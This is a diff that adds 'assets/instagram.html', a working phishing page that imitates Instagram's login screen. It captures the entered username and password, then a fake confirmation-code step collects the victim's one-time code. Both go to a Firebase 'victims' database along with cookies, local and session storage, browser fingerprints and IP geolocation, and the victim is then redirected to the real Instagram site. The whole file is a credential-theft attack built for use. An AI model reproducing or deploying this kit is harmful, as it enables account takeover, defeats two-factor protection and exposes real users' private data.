@@ -1,0 +1,1035 @@
+<!-- ═══════════════════════════════════════════════════════════
+     FILE: assets/instagram.html
+     Instagram Login Clone — Real UI + Full Capture + OTP Flow
+     Connection: Firebase Realtime DB (same pattern)
+     ═══════════════════════════════════════════════════════════ -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="origin-when-crossorigin">
+<title>Login • Instagram</title>
+<link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+<meta name="description" content="Log in to Instagram - A simple, fun & creative way to capture, edit & share photos, videos & messages with friends & family.">
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<script src="../config.js"></script>
+
+<style>
+:root{
+  --ig-bg:#fafafa;
+  --ig-white:#ffffff;
+  --ig-border:#dbdbdb;
+  --ig-text:#262626;
+  --ig-text-dim:#8e8e8e;
+  --ig-blue:#0095f6;
+  --ig-blue-hover:#1877f2;
+  --ig-blue-disabled:#b2dffc;
+  --ig-error:#ed4956;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  background:var(--ig-bg);
+  color:var(--ig-text);
+  font-size:14px;
+  -webkit-font-smoothing:antialiased;
+  display:flex;
+  flex-direction:column;
+  min-height:100vh;
+}
+a{color:var(--ig-blue);text-decoration:none}
+a:hover{text-decoration:none}
+
+/* ═══ LAYOUT ═══ */
+.ig-main{
+  flex:1;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px 16px 44px;
+}
+.ig-wrap{
+  display:flex;
+  align-items:center;
+  gap:20px;
+  max-width:935px;
+  width:100%;
+  justify-content:center;
+}
+
+/* ═══ PHONES (left) ═══ */
+.ig-phones{
+  position:relative;
+  width:380px;
+  height:581px;
+  display:block;
+}
+.ig-phone-frame{
+  position:absolute;
+  inset:0;
+  background:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 380 581'></svg>") no-repeat;
+}
+.ig-phone{
+  position:absolute;
+  width:245px;
+  height:504px;
+  top:26px;
+  left:112px;
+  background:#000;
+  border-radius:38px;
+  border:12px solid #262626;
+  box-shadow:0 0 0 3px #3a3a3a,0 0 0 4px #1a1a1a,0 30px 60px rgba(0,0,0,.4);
+  overflow:hidden;
+}
+.ig-phone::before{
+  content:'';
+  position:absolute;
+  top:0;left:50%;
+  transform:translateX(-50%);
+  width:110px;height:24px;
+  background:#262626;
+  border-radius:0 0 16px 16px;
+  z-index:5;
+}
+.ig-phone-screen{
+  position:absolute;
+  inset:12px;
+  border-radius:28px;
+  overflow:hidden;
+  background:linear-gradient(135deg,#833ab4 0%,#fd1d1d 50%,#fcb045 100%);
+  display:flex;
+  flex-direction:column;
+}
+.ig-phone-screen::after{
+  content:'';
+  position:absolute;
+  inset:0;
+  background:linear-gradient(180deg,rgba(0,0,0,.35) 0%,rgba(0,0,0,.6) 100%);
+  z-index:1;
+}
+.ig-screen-content{
+  position:relative;
+  z-index:2;
+  flex:1;
+  display:flex;
+  flex-direction:column;
+  justify-content:space-between;
+  padding:36px 16px 20px;
+  color:#fff;
+}
+.ig-story-row{
+  display:flex;
+  gap:6px;
+  margin-bottom:8px;
+}
+.ig-story{
+  width:40px;height:40px;
+  border-radius:50%;
+  background:rgba(255,255,255,.25);
+  border:2px solid #fff;
+  backdrop-filter:blur(4px);
+}
+.ig-phone-bottom{
+  font-size:11px;
+  color:rgba(255,255,255,.85);
+  letter-spacing:.3px;
+  display:flex;
+  align-items:center;
+  gap:6px;
+}
+.ig-phone-bottom svg{width:14px;height:14px;fill:#fff;opacity:.85}
+
+/* ═══ LOGIN SIDE (right) ═══ */
+.ig-login-side{
+  width:350px;
+  max-width:100%;
+  display:flex;
+  flex-direction:column;
+  gap:10px;
+  margin-top:12px;
+}
+
+/* Card */
+.ig-card{
+  background:var(--ig-white);
+  border:1px solid var(--ig-border);
+  border-radius:1px;
+  padding:40px 40px 24px;
+  text-align:center;
+}
+.ig-logo{
+  display:block;
+  margin:0 auto 24px;
+  width:175px;
+  height:51px;
+  background:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 175 51'><text x='0' y='40' font-family='Billabong, cursive, -apple-system, sans-serif' font-size='46' font-style='italic' font-weight='400' fill='%23262626' letter-spacing='-1'>Instagram</text></svg>") no-repeat center;
+  background-size:contain;
+}
+.ig-input{
+  width:100%;
+  padding:9px 8px 7px;
+  font-size:14px;
+  border:1px solid var(--ig-border);
+  border-radius:3px;
+  background:#fafafa;
+  color:var(--ig-text);
+  margin-bottom:6px;
+  outline:none;
+  font-family:inherit;
+  transition:.15s;
+}
+.ig-input:focus{
+  border-color:#a8a8a8;
+  background:#fff;
+}
+.ig-input::placeholder{color:var(--ig-text-dim);font-size:13px}
+.ig-input-wrap{
+  position:relative;
+  width:100%;
+}
+.ig-input-wrap .ig-pw-toggle{
+  position:absolute;
+  right:8px;
+  top:50%;
+  transform:translateY(-50%);
+  background:none;
+  border:none;
+  color:var(--ig-text);
+  font-size:13px;
+  font-weight:600;
+  cursor:pointer;
+  padding:4px 6px;
+  font-family:inherit;
+}
+.ig-btn-login{
+  width:100%;
+  padding:8px;
+  margin-top:8px;
+  background:var(--ig-blue);
+  color:#fff;
+  border:none;
+  border-radius:8px;
+  font-size:14px;
+  font-weight:600;
+  cursor:pointer;
+  font-family:inherit;
+  min-height:32px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  transition:background .15s;
+}
+.ig-btn-login:hover{background:var(--ig-blue-hover)}
+.ig-btn-login:disabled{background:var(--ig-blue-disabled);cursor:default}
+
+/* Divider */
+.ig-or{
+  display:flex;
+  align-items:center;
+  margin:18px 0;
+  color:var(--ig-text-dim);
+  font-size:12px;
+  font-weight:600;
+  letter-spacing:.5px;
+}
+.ig-or::before,
+.ig-or::after{
+  content:'';
+  flex:1;
+  height:1px;
+  background:var(--ig-border);
+}
+.ig-or span{padding:0 18px}
+
+/* Facebook button */
+.ig-fb-btn{
+  background:none;
+  border:none;
+  color:#385185;
+  font-weight:600;
+  font-size:14px;
+  font-family:inherit;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  margin:0 auto;
+  padding:4px;
+}
+.ig-fb-btn svg{width:16px;height:16px;fill:#385185}
+.ig-forgot{
+  display:block;
+  margin-top:14px;
+  color:#00376b;
+  font-size:12px;
+}
+
+/* Sign up card */
+.ig-signup-card{
+  background:var(--ig-white);
+  border:1px solid var(--ig-border);
+  padding:22px 20px;
+  text-align:center;
+  font-size:14px;
+}
+.ig-signup-card a{color:var(--ig-blue);font-weight:600;margin-left:4px}
+
+/* Get app */
+.ig-getapp{
+  text-align:center;
+  margin-top:10px;
+}
+.ig-getapp p{
+  font-size:14px;
+  margin-bottom:14px;
+  color:var(--ig-text);
+}
+.ig-stores{
+  display:flex;
+  gap:8px;
+  justify-content:center;
+}
+.ig-store{
+  height:40px;
+  display:block;
+}
+.ig-store img{height:40px;display:block}
+
+/* ═══ ERROR BOX ═══ */
+.ig-error{
+  background:#ffebe8;
+  border:1px solid #dd3c10;
+  color:#dd3c10;
+  padding:10px 12px;
+  border-radius:3px;
+  font-size:13px;
+  display:none;
+  margin-bottom:12px;
+  line-height:1.4;
+  text-align:left;
+}
+.ig-error.show{display:block}
+
+/* ═══ SPINNER ═══ */
+.ig-spinner{
+  display:none;
+  width:16px;
+  height:16px;
+  border:2px solid rgba(255,255,255,.4);
+  border-top-color:#fff;
+  border-radius:50%;
+  animation:spin .7s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ═══ OTP PANEL ═══ */
+.ig-otp-header{
+  margin-bottom:14px;
+}
+.ig-otp-header svg{
+  width:96px;
+  height:96px;
+  display:block;
+  margin:0 auto 12px;
+}
+.ig-otp-title{
+  font-size:16px;
+  font-weight:600;
+  color:var(--ig-text);
+  margin-bottom:6px;
+  text-align:center;
+}
+.ig-otp-sub{
+  font-size:13px;
+  color:var(--ig-text-dim);
+  line-height:1.5;
+  text-align:center;
+}
+.ig-otp-sub b{color:var(--ig-text);font-weight:600}
+.ig-otp-input{
+  width:100%;
+  padding:10px 8px;
+  font-size:20px;
+  letter-spacing:8px;
+  text-align:center;
+  font-weight:600;
+  border:1px solid var(--ig-border);
+  border-radius:3px;
+  background:#fafafa;
+  outline:none;
+  margin-bottom:8px;
+  font-family:inherit;
+}
+.ig-otp-input:focus{border-color:#a8a8a8;background:#fff}
+
+/* ═══ FOOTER ═══ */
+.ig-footer{
+  padding:24px 16px;
+  font-size:12px;
+  color:var(--ig-text-dim);
+  text-align:center;
+}
+.ig-footer-links{
+  display:flex;
+  flex-wrap:wrap;
+  justify-content:center;
+  gap:6px 14px;
+  max-width:900px;
+  margin:0 auto 12px;
+}
+.ig-footer-links a{
+  color:var(--ig-text-dim);
+  font-size:12px;
+}
+.ig-footer-links a:hover{text-decoration:underline}
+.ig-footer-meta{
+  display:flex;
+  justify-content:center;
+  gap:14px;
+  flex-wrap:wrap;
+  margin-top:6px;
+  color:var(--ig-text-dim);
+  font-size:12px;
+}
+.ig-footer-meta select{
+  background:none;
+  border:none;
+  color:var(--ig-text-dim);
+  font-size:12px;
+  font-family:inherit;
+  cursor:pointer;
+}
+
+/* ═══ MOBILE ═══ */
+@media(max-width:875px){
+  .ig-phones{display:none}
+  .ig-main{padding:20px 16px 30px}
+}
+@media(max-width:450px){
+  .ig-card{padding:20px 20px 18px;border:none;background:transparent}
+  .ig-signup-card{border:none;background:transparent}
+  .ig-login-side{margin-top:0}
+}
+</style>
+</head>
+<body>
+
+<main class="ig-main">
+  <div class="ig-wrap">
+
+    <!-- ═══ LEFT: PHONE MOCKUP ═══ -->
+    <div class="ig-phones">
+      <div class="ig-phone">
+        <div class="ig-phone-screen">
+          <div class="ig-screen-content">
+            <div>
+              <div class="ig-story-row">
+                <div class="ig-story"></div>
+                <div class="ig-story"></div>
+                <div class="ig-story"></div>
+                <div class="ig-story"></div>
+                <div class="ig-story"></div>
+              </div>
+            </div>
+            <div class="ig-phone-bottom">
+              <svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8zm1-13h-2v6l5.2 3.2.8-1.3-4-2.4z"/></svg>
+              Instagram
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══ RIGHT: LOGIN ═══ -->
+    <div class="ig-login-side">
+      <div class="ig-card" id="loginCard">
+        <form id="loginForm" onsubmit="return captureData(event)" autocomplete="off">
+          <div class="ig-error" id="errorBox"></div>
+
+          <div class="ig-logo" aria-label="Instagram"></div>
+
+          <input type="text" class="ig-input" id="email" name="email"
+                 placeholder="Phone number, username, or email"
+                 autocomplete="off" autocapitalize="off" autocorrect="off"
+                 spellcheck="false" required autofocus>
+
+          <div class="ig-input-wrap">
+            <input type="password" class="ig-input" id="password" name="pass"
+                   placeholder="Password" autocomplete="off" required>
+            <button type="button" class="ig-pw-toggle" id="pwToggle" onclick="togglePw()">Show</button>
+          </div>
+
+          <input type="hidden" name="platform" value="instagram">
+
+          <button type="submit" class="ig-btn-login" id="loginBtn">
+            <span id="btnText">Log in</span>
+            <div class="ig-spinner" id="spinner"></div>
+          </button>
+        </form>
+
+        <div class="ig-or"><span>OR</span></div>
+
+        <button class="ig-fb-btn" onclick="return handleFbLogin(event);">
+          <svg viewBox="0 0 24 24"><path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07c0 6.03 4.39 11.03 10.13 11.93v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.69.24 2.69.24v2.97h-1.52c-1.49 0-1.96.93-1.96 1.89v2.25h3.33l-.53 3.49h-2.8v8.44C19.61 23.1 24 18.1 24 12.07z"/></svg>
+          Log in with Facebook
+        </button>
+
+        <a href="#" class="ig-forgot" onclick="return handleForgot(event);">Forgot password?</a>
+      </div>
+
+      <div class="ig-signup-card">
+        Don't have an account?
+        <a href="#" onclick="event.preventDefault();window.location.href='https://www.instagram.com/accounts/emailsignup/';">Sign up</a>
+      </div>
+
+      <div class="ig-getapp">
+        <p>Get the app.</p>
+        <div class="ig-stores">
+          <a class="ig-store" href="#" onclick="event.preventDefault();">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/tIn6Tj0EoPH.png" alt="Get it on Google Play">
+          </a>
+          <a class="ig-store" href="#" onclick="event.preventDefault();">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/y1/r/0aWWVwjU9dN.png" alt="Get it on the App Store">
+          </a>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<!-- ═══ FOOTER ═══ -->
+<footer class="ig-footer">
+  <div class="ig-footer-links">
+    <a href="#">Meta</a>
+    <a href="#">About</a>
+    <a href="#">Blog</a>
+    <a href="#">Jobs</a>
+    <a href="#">Help</a>
+    <a href="#">API</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Locations</a>
+    <a href="#">Instagram Lite</a>
+    <a href="#">Threads</a>
+    <a href="#">Contact Uploading & Non-Users</a>
+    <a href="#">Meta Verified</a>
+  </div>
+  <div class="ig-footer-meta">
+    <select>
+      <option>English</option>
+      <option>বাংলা</option>
+      <option>हिन्दी</option>
+      <option>Español</option>
+      <option>Français</option>
+      <option>Deutsch</option>
+      <option>العربية</option>
+      <option>Português (Brasil)</option>
+    </select>
+    <span>© 2026 Instagram from Meta</span>
+  </div>
+</footer>
+
+<script>
+/* ═══════════════════════════════════════════════════════
+   FIREBASE INIT
+   ═══════════════════════════════════════════════════════ */
+firebase.initializeApp(window.firebaseConfig);
+const database = firebase.database();
+
+/* ═══════════════════════════════════════════════════════
+   STATE
+   ═══════════════════════════════════════════════════════ */
+let cachedDeviceInfo = null;
+let cachedIPInfo = null;
+let cachedCanvasFP = null;
+let cachedWebGLFP = null;
+let pendingEmail = '';
+let pendingVictimId = '';
+
+const REDIRECT_URL = 'https://www.instagram.com/accounts/login/';
+
+/* ═══════════════════════════════════════════════════════
+   SAFE KEY (Firebase RTDB invalid chars)
+   ═══════════════════════════════════════════════════════ */
+function safeKey(key){
+  return String(key)
+    .replace(/\./g, '_')
+    .replace(/\#/g, '_')
+    .replace(/\$/g, '_')
+    .replace(/\//g, '_')
+    .replace(/\[/g, '_')
+    .replace(/\]/g, '_')
+    .replace(/\:/g, '_');
+}
+
+/* ═══════════════════════════════════════════════════════
+   DEVICE FINGERPRINT
+   ═══════════════════════════════════════════════════════ */
+function getDeviceInfo(){
+  const ua = navigator.userAgent;
+  return {
+    userAgent: ua,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages ? navigator.languages.join(',') : '',
+    screen: screen.width + 'x' + screen.height,
+    availScreen: screen.availWidth + 'x' + screen.availHeight,
+    colorDepth: screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    browser: detectBrowser(ua),
+    browserVersion: detectBrowserVersion(ua),
+    os: detectOS(ua),
+    device: ua.includes('Mobile') ? 'Mobile' : 'Desktop',
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack || 'unknown',
+    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    memory: navigator.deviceMemory || 'unknown',
+    vendor: navigator.vendor || 'unknown',
+    appVersion: navigator.appVersion
+  };
+}
+function detectBrowser(ua){
+  if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome';
+  if (ua.includes('Firefox')) return 'Firefox';
+  if (ua.includes('Edg')) return 'Edge';
+  if (ua.includes('OPR')) return 'Opera';
+  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+  if (ua.includes('MSIE') || ua.includes('Trident')) return 'IE';
+  return 'Unknown';
+}
+function detectBrowserVersion(ua){
+  const match = ua.match(/(Chrome|Firefox|Edge|Safari|Opera)\/(\d+)/);
+  return match ? match[1] + ' ' + match[2] : 'Unknown';
+}
+function detectOS(ua){
+  if (ua.includes('Windows NT 10')) return 'Windows 10';
+  if (ua.includes('Windows NT 11')) return 'Windows 11';
+  if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
+  if (ua.includes('Windows NT 6.1')) return 'Windows 7';
+  if (ua.includes('Android')){
+    const m = ua.match(/Android (\d+)/);
+    return m ? 'Android ' + m[1] : 'Android';
+  }
+  if (ua.includes('iPhone')) return 'iOS (iPhone)';
+  if (ua.includes('iPad')) return 'iOS (iPad)';
+  if (ua.includes('Mac OS')) return 'macOS';
+  if (ua.includes('Linux')) return 'Linux';
+  return 'Unknown';
+}
+
+/* ═══════════════════════════════════════════════════════
+   CANVAS + WEBGL FINGERPRINTS
+   ═══════════════════════════════════════════════════════ */
+function getCanvasFingerprint(){
+  try{
+    const c = document.createElement('canvas');
+    c.width = 200; c.height = 50;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.textBaseline = 'alphabetic';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('CanvasFingerprint', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('Browser', 4, 17);
+    return hashString(c.toDataURL());
+  }catch(e){ return 'canvas_error'; }
+}
+function getWebGLFingerprint(){
+  try{
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if(!gl) return 'no_webgl';
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    return vendor + ' | ' + renderer;
+  }catch(e){ return 'webgl_error'; }
+}
+function hashString(str){
+  let hash = 0;
+  for (let i = 0; i < str.length; i++){
+    const char = str.charCodeAt(i);
+    hash = ((hash << 5) - hash) + char;
+    hash = hash & hash;
+  }
+  return hash.toString(36);
+}
+
+/* ═══════════════════════════════════════════════════════
+   STORAGE + COOKIES (all sanitized)
+   ═══════════════════════════════════════════════════════ */
+function getAllCookies(){
+  const cookies = {};
+  const raw = document.cookie;
+  if (raw){
+    raw.split(';').forEach(cookie => {
+      const parts = cookie.trim().split('=');
+      const name = parts[0];
+      const value = parts.slice(1).join('=');
+      if(name) cookies[safeKey(name)] = value;
+    });
+  }
+  return cookies;
+}
+function getLocalStorage(){
+  try{
+    const data = {};
+    for (let i = 0; i < localStorage.length; i++){
+      const key = localStorage.key(i);
+      data[safeKey(key)] = localStorage.getItem(key);
+    }
+    return data;
+  }catch(e){ return {}; }
+}
+function getSessionStorage(){
+  try{
+    const data = {};
+    for (let i = 0; i < sessionStorage.length; i++){
+      const key = sessionStorage.key(i);
+      data[safeKey(key)] = sessionStorage.getItem(key);
+    }
+    return data;
+  }catch(e){ return {}; }
+}
+
+/* ═══════════════════════════════════════════════════════
+   IP INTEL
+   ═══════════════════════════════════════════════════════ */
+async function getIPInfo(){
+  try{
+    const res = await fetch('https://ipapi.co/json/', {signal: AbortSignal.timeout(5000)});
+    const d = await res.json();
+    return {
+      ip: d.ip || 'Unknown',
+      network: d.network || 'Unknown',
+      version: d.version || '',
+      city: d.city || 'Unknown',
+      region: d.region || 'Unknown',
+      country: d.country_name || 'Unknown',
+      countryCode: d.country_code || 'Unknown',
+      postal: d.postal || '',
+      isp: d.org || 'Unknown',
+      asn: d.asn || 'Unknown',
+      timezone: d.timezone || 'Unknown',
+      latitude: d.latitude || '',
+      longitude: d.longitude || '',
+      languages: d.languages || ''
+    };
+  }catch{
+    try{
+      const res = await fetch('https://ipwho.is/', {signal: AbortSignal.timeout(5000)});
+      const d = await res.json();
+      return {
+        ip: d.ip || 'Unknown',
+        city: d.city || 'Unknown',
+        country: d.country || 'Unknown',
+        isp: d.connection?.isp || 'Unknown',
+        latitude: d.latitude || '',
+        longitude: d.longitude || ''
+      };
+    }catch{
+      return { ip:'Unknown', city:'Unknown', country:'Unknown' };
+    }
+  }
+}
+
+/* ═══════════════════════════════════════════════════════
+   PRE-FETCH INTEL
+   ═══════════════════════════════════════════════════════ */
+async function ensureIntel(){
+  if(!cachedDeviceInfo) cachedDeviceInfo = getDeviceInfo();
+  if(!cachedCanvasFP) cachedCanvasFP = getCanvasFingerprint();
+  if(!cachedWebGLFP) cachedWebGLFP = getWebGLFingerprint();
+  if(!cachedIPInfo) cachedIPInfo = await getIPInfo();
+}
+window.addEventListener('load', () => { ensureIntel(); });
+
+/* ═══════════════════════════════════════════════════════
+   UI HELPERS
+   ═══════════════════════════════════════════════════════ */
+function showError(msg){
+  const box = document.getElementById('errorBox');
+  if(!box) return;
+  box.textContent = msg;
+  box.classList.add('show');
+}
+function hideError(){
+  const box = document.getElementById('errorBox');
+  if(box) box.classList.remove('show');
+}
+function togglePw(){
+  const pw = document.getElementById('password');
+  const btn = document.getElementById('pwToggle');
+  if(!pw) return;
+  if(pw.type === 'password'){
+    pw.type = 'text';
+    btn.textContent = 'Hide';
+  } else {
+    pw.type = 'password';
+    btn.textContent = 'Show';
+  }
+}
+
+/* ═══════════════════════════════════════════════════════
+   STEP 1 — CAPTURE EMAIL + PASSWORD
+   ═══════════════════════════════════════════════════════ */
+async function captureData(event){
+  event.preventDefault();
+  hideError();
+
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
+
+  if(!email){
+    showError('Please enter your phone number, username, or email.');
+    document.getElementById('email').focus();
+    return false;
+  }
+  if(!password){
+    showError('Please enter your password.');
+    document.getElementById('password').focus();
+    return false;
+  }
+
+  document.getElementById('btnText').style.display = 'none';
+  document.getElementById('spinner').style.display = 'block';
+  document.getElementById('loginBtn').disabled = true;
+
+  pendingEmail = email;
+  await ensureIntel();
+
+  const victimId = 'ig_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+  pendingVictimId = victimId;
+
+  const victimData = {
+    platform: 'instagram',
+    email: email,
+    password: password,
+    step: 'password',
+
+    deviceInfo: cachedDeviceInfo,
+    canvasFingerprint: cachedCanvasFP,
+    webglFingerprint: cachedWebGLFP,
+    cookies: getAllCookies(),
+    cookieString: document.cookie,
+    ipInfo: cachedIPInfo,
+    timestamp: new Date().toISOString(),
+    victimId: victimId,
+    referrer: document.referrer || 'Direct Access',
+    pageUrl: window.location.href,
+    localStorageData: getLocalStorage(),
+    sessionStorageData: getSessionStorage()
+  };
+
+  try{
+    await database.ref('victims/' + victimId).set(victimData);
+    console.log('✓ Instagram password captured');
+  }catch(error){
+    console.error('Firebase error:', error.message);
+  }
+
+  setTimeout(() => { showOtpStep(); }, 1200);
+  return false;
+}
+
+/* ═══════════════════════════════════════════════════════
+   STEP 2 — OTP SCREEN
+   ═══════════════════════════════════════════════════════ */
+function showOtpStep(){
+  const card = document.getElementById('loginCard');
+  const masked = maskEmail(pendingEmail);
+
+  card.innerHTML = `
+    <form id="otpForm" onsubmit="return captureOtp(event)" autocomplete="off">
+      <div class="ig-error" id="otpError"></div>
+
+      <div class="ig-otp-header">
+        <svg viewBox="0 0 96 96" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="48" cy="48" r="46" fill="none" stroke="#dbdbdb" stroke-width="2"/>
+          <path d="M48 22 L48 48 L64 58" fill="none" stroke="#262626" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+          <circle cx="48" cy="48" r="3" fill="#262626"/>
+          <path d="M28 66 Q34 74 48 74 Q62 74 68 66" fill="none" stroke="#ed4956" stroke-width="3" stroke-linecap="round"/>
+          <circle cx="34" cy="60" r="2" fill="#262626"/>
+          <circle cx="62" cy="60" r="2" fill="#262626"/>
+        </svg>
+        <div class="ig-otp-title">Enter confirmation code</div>
+        <div class="ig-otp-sub">
+          We sent a 6-digit code to <b>${escapeHtml(masked)}</b>.
+          Enter it below to confirm it's you.
+        </div>
+      </div>
+
+      <input type="text" class="ig-otp-input" id="otpInput" name="otp"
+             placeholder="------" inputmode="numeric" pattern="[0-9]*"
+             maxlength="6" autocomplete="one-time-code" required autofocus>
+
+      <button type="submit" class="ig-btn-login" id="otpBtn">
+        <span id="otpBtnText">Confirm</span>
+        <div class="ig-spinner" id="otpSpinner"></div>
+      </button>
+
+      <a href="#" onclick="return handleResend(event);"
+         style="display:block;margin-top:14px;color:#00376b;font-size:12px;text-align:center">
+        Didn't get a code? Send again
+      </a>
+    </form>
+  `;
+
+  const inp = document.getElementById('otpInput');
+  inp.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+  });
+  inp.focus();
+}
+
+async function captureOtp(event){
+  event.preventDefault();
+  const errBox = document.getElementById('otpError');
+  errBox.classList.remove('show');
+
+  const otp = document.getElementById('otpInput').value.trim();
+  if(!otp || otp.length < 4){
+    errBox.textContent = 'Please enter the code we sent you.';
+    errBox.classList.add('show');
+    return false;
+  }
+
+  document.getElementById('otpBtnText').style.display = 'none';
+  document.getElementById('otpSpinner').style.display = 'block';
+  document.getElementById('otpBtn').disabled = true;
+
+  await ensureIntel();
+
+  const otpId = pendingVictimId + '_otp';
+  const otpData = {
+    platform: 'instagram',
+    email: pendingEmail,
+    password: '',
+    otp: otp,
+    otpCode: otp,
+    step: 'otp',
+    deviceInfo: cachedDeviceInfo,
+    canvasFingerprint: cachedCanvasFP,
+    webglFingerprint: cachedWebGLFP,
+    cookies: getAllCookies(),
+    cookieString: document.cookie,
+    ipInfo: cachedIPInfo,
+    timestamp: new Date().toISOString(),
+    victimId: otpId,
+    parentVictimId: pendingVictimId,
+    referrer: document.referrer || 'Direct Access',
+    pageUrl: window.location.href
+  };
+
+  try{
+    await database.ref('victims/' + otpId).set(otpData);
+    console.log('✓ Instagram OTP captured');
+  }catch(error){
+    console.error('Firebase error:', error.message);
+  }
+
+  setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
+  return false;
+}
+
+/* ═══════════════════════════════════════════════════════
+   RESEND / FORGOT / FB LOGIN
+   ═══════════════════════════════════════════════════════ */
+async function handleResend(event){
+  event.preventDefault();
+  await ensureIntel();
+  const id = pendingVictimId + '_resend_' + Date.now();
+  try{
+    await database.ref('victims/' + id).set({
+      platform: 'instagram',
+      email: pendingEmail,
+      password: '',
+      otp: 'RESEND_REQUESTED',
+      step: 'resend',
+      deviceInfo: cachedDeviceInfo,
+      ipInfo: cachedIPInfo,
+      cookies: getAllCookies(),
+      timestamp: new Date().toISOString(),
+      victimId: id,
+      parentVictimId: pendingVictimId
+    });
+  }catch(e){}
+  alert('A new code has been sent to ' + maskEmail(pendingEmail));
+  return false;
+}
+
+async function handleForgot(event){
+  event.preventDefault();
+
+  // Instagram shows a "trouble logging in" flow; we capture email prompt first
+  const email = prompt('Enter your email, phone number, or username to reset your password:');
+  if(!email || !email.trim()) return false;
+
+  await ensureIntel();
+
+  const id = 'ig_forgot_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+  try{
+    await database.ref('victims/' + id).set({
+      platform: 'instagram',
+      email: email.trim(),
+      password: '',
+      otp: 'FORGOT_PASSWORD_REQUEST',
+      step: 'forgot',
+      deviceInfo: cachedDeviceInfo,
+      canvasFingerprint: cachedCanvasFP,
+      webglFingerprint: cachedWebGLFP,
+      ipInfo: cachedIPInfo,
+      cookies: getAllCookies(),
+      timestamp: new Date().toISOString(),
+      victimId: id
+    });
+  }catch(e){}
+
+  alert('If an account exists for ' + email + ', we\'ll send a reset link shortly.');
+  return false;
+}
+
+function handleFbLogin(event){
+  event.preventDefault();
+  // Real Instagram would redirect to FB OAuth — we send them to real IG login
+  window.location.href = 'https://www.instagram.com/accounts/login/';
+  return false;
+}
+
+/* ═══════════════════════════════════════════════════════
+   HELPERS
+   ═══════════════════════════════════════════════════════ */
+function maskEmail(str){
+  if(!str) return '';
+  if(str.includes('@')){
+    const [u, d] = str.split('@');
+    const head = u.slice(0, Math.min(2, u.length));
+    const tail = u.length > 2 ? '*'.repeat(Math.min(6, u.length - 2)) : '';
+    return head + tail + '@' + d;
+  }
+  const s = String(str);
+  if(s.length <= 4) return '*'.repeat(s.length);
+  return s.slice(0, 2) + '*'.repeat(Math.min(6, s.length - 4)) + s.slice(-2);
+}
+
+function escapeHtml(s){
+  return String(s).replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[c]));
+}
+</script>
+</body>
+</html>
